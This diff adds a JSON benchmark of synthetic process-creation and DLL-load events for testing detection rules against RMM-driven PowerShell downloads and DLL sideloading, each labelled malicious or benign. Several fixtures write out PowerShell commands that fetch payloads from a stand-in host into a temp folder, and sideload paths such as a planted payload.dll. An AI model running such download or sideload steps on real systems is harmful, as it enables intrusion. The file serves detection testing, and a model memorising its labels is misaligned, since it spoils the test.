@@ -1,0 +1,198 @@
+{
+  "schema_version": 1,
+  "benchmark_id": "fictional-event-challenge-v1",
+  "provenance": "analyst_authored_synthetic_scenarios_not_real_incident_logs",
+  "note": "Adversarial assumptions constructed independently of the generated rule text; some malicious scenarios intentionally violate the published exact selector, and authorized administration intentionally overlaps. Nothing represents real alert volume or validated ground truth.",
+  "cases": [
+    {
+      "report_id": "microsoft-rmm-sept2026",
+      "reference_name": "RMM agent launches PowerShell download",
+      "scenarios": [
+        {
+          "id": "rmm-exact-reported",
+          "scenario": "Fictional malicious RMM to PowerShell Invoke-WebRequest chain",
+          "expected_malicious": true,
+          "event": {
+            "event_type": "process_creation",
+            "ParentImage": "C:\\Program Files\\RMM\\RMM.Agent.exe",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -NoProfile -Command Invoke-WebRequest https://example.test/installer -OutFile C:\\Temp\\pkg.msi"
+          }
+        },
+        {
+          "id": "rmm-benign-collision",
+          "scenario": "Authorized IT installer using identical RMM PowerShell command",
+          "expected_malicious": false,
+          "event": {
+            "event_type": "process_creation",
+            "ParentImage": "C:\\Program Files\\RMM\\RMM.Agent.exe",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe Invoke-WebRequest https://example.test/approved-package"
+          }
+        },
+        {
+          "id": "rmm-attacker-alternate",
+          "scenario": "Fictional malicious RMM child uses Invoke-RestMethod rather than Invoke-WebRequest",
+          "expected_malicious": true,
+          "event": {
+            "event_type": "process_creation",
+            "ParentImage": "C:\\Program Files\\RMM\\RMM.Agent.exe",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe Invoke-RestMethod https://example.test/data"
+          }
+        },
+        {
+          "id": "rmm-benign-unrelated",
+          "scenario": "Benign RMM launches PowerShell to query installed services",
+          "expected_malicious": false,
+          "event": {
+            "event_type": "process_creation",
+            "ParentImage": "C:\\Program Files\\RMM\\RMM.Agent.exe",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe Get-Service"
+          }
+        },
+        {
+          "id": "rmm-missing-parent",
+          "scenario": "Fictional malicious downloader but parent field is unavailable",
+          "expected_malicious": true,
+          "event": {
+            "event_type": "process_creation",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe Invoke-WebRequest https://example.test/stage"
+          }
+        }
+      ]
+    },
+    {
+      "report_id": "talos-antino2026",
+      "reference_name": "GatherOsState sideloading slc DLL",
+      "scenarios": [
+        {
+          "id": "antino-report-match",
+          "scenario": "Fictional malicious GatherOsState loads slc DLL from writable directory",
+          "expected_malicious": true,
+          "event": {
+            "event_type": "image_load",
+            "Image": "C:\\ProgramData\\Tools\\GatherOsState.exe",
+            "ImageLoaded": "C:\\Users\\Public\\slc.dll"
+          }
+        },
+        {
+          "id": "antino-benign-collision",
+          "scenario": "Authorized testing tool loads a DLL with the same basename",
+          "expected_malicious": false,
+          "event": {
+            "event_type": "image_load",
+            "Image": "C:\\ProgramData\\Tools\\GatherOsState.exe",
+            "ImageLoaded": "C:\\Tools\\test\\slc.dll"
+          }
+        },
+        {
+          "id": "antino-benign-system32",
+          "scenario": "System32 module load should be excluded from same-name rule",
+          "expected_malicious": false,
+          "event": {
+            "event_type": "image_load",
+            "Image": "C:\\ProgramData\\Tools\\GatherOsState.exe",
+            "ImageLoaded": "C:\\Windows\\System32\\slc.dll"
+          }
+        },
+        {
+          "id": "antino-attacker-rename",
+          "scenario": "Fictional malicious sideload substitutes an alternate module name",
+          "expected_malicious": true,
+          "event": {
+            "event_type": "image_load",
+            "Image": "C:\\ProgramData\\Tools\\GatherOsState.exe",
+            "ImageLoaded": "C:\\Users\\Public\\renamed.dll"
+          }
+        },
+        {
+          "id": "antino-missing-module",
+          "scenario": "Fictional malicious load without the ImageLoaded telemetry field",
+          "expected_malicious": true,
+          "event": {
+            "event_type": "image_load",
+            "Image": "C:\\ProgramData\\Tools\\GatherOsState.exe"
+          }
+        },
+        {
+          "id": "antino-benign-other-host",
+          "scenario": "Unrelated process loads slc DLL for ordinary software use",
+          "expected_malicious": false,
+          "event": {
+            "event_type": "image_load",
+            "Image": "C:\\Windows\\System32\\notepad.exe",
+            "ImageLoaded": "C:\\Tools\\slc.dll"
+          }
+        }
+      ]
+    },
+    {
+      "report_id": "talos-gamaredon-remcos2025",
+      "reference_name": "TiVoDiag loads mindclient DLL",
+      "scenarios": [
+        {
+          "id": "gamaredon-reported",
+          "scenario": "Fictional malicious TiVoDiag loads mindclient DLL from public path",
+          "expected_malicious": true,
+          "event": {
+            "event_type": "image_load",
+            "Image": "C:\\Users\\Public\\TivoDiag.exe",
+            "ImageLoaded": "C:\\Users\\Public\\mindclient.dll"
+          }
+        },
+        {
+          "id": "gamaredon-benign-same",
+          "scenario": "Benign compatibility lab loads identically named module",
+          "expected_malicious": false,
+          "event": {
+            "event_type": "image_load",
+            "Image": "C:\\Lab\\TivoDiag.exe",
+            "ImageLoaded": "C:\\Lab\\mindclient.dll"
+          }
+        },
+        {
+          "id": "gamaredon-malicious-mod",
+          "scenario": "Fictional attacker uses a different DLL name",
+          "expected_malicious": true,
+          "event": {
+            "event_type": "image_load",
+            "Image": "C:\\Users\\Public\\TivoDiag.exe",
+            "ImageLoaded": "C:\\Users\\Public\\payload.dll"
+          }
+        },
+        {
+          "id": "gamaredon-benign-excluded",
+          "scenario": "System32 DLL load is excluded even with same base name",
+          "expected_malicious": false,
+          "event": {
+            "event_type": "image_load",
+            "Image": "C:\\Lab\\TivoDiag.exe",
+            "ImageLoaded": "C:\\Windows\\System32\\mindclient.dll"
+          }
+        },
+        {
+          "id": "gamaredon-malicious-blind",
+          "scenario": "Fictional malicious DLL load with no loaded-module path logged",
+          "expected_malicious": true,
+          "event": {
+            "event_type": "image_load",
+            "Image": "C:\\Users\\Public\\TivoDiag.exe"
+          }
+        },
+        {
+          "id": "gamaredon-benign-other",
+          "scenario": "Benign different process loads the same DLL basename",
+          "expected_malicious": false,
+          "event": {
+            "event_type": "image_load",
+            "Image": "C:\\Lab\\Notepad.exe",
+            "ImageLoaded": "C:\\Lab\\mindclient.dll"
+          }
+        }
+      ]
+    }
+  ]
+}
